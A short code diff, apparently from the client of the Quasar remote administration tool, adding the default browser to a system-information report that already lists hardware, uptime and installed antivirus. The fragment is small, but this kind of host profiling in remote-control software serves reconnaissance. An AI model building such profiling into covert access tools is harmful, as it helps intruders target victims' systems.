@@ -91,7 +91,8 @@ namespace Quasar.Client.Messages
                         GPU = HardwareDevices.GpuNames,
                         RAM = HardwareDevices.TotalPhysicalMemory.ToString(),
                         Uptime = SystemHelper.GetUptime(),
-                        AV = SystemHelper.GetAntivirus()
+                        AV = SystemHelper.GetAntivirus(),
+                        MainBrowser = SystemHelper.GetDefaultBrowser()
                     });
 
                     _streamCodec = null;
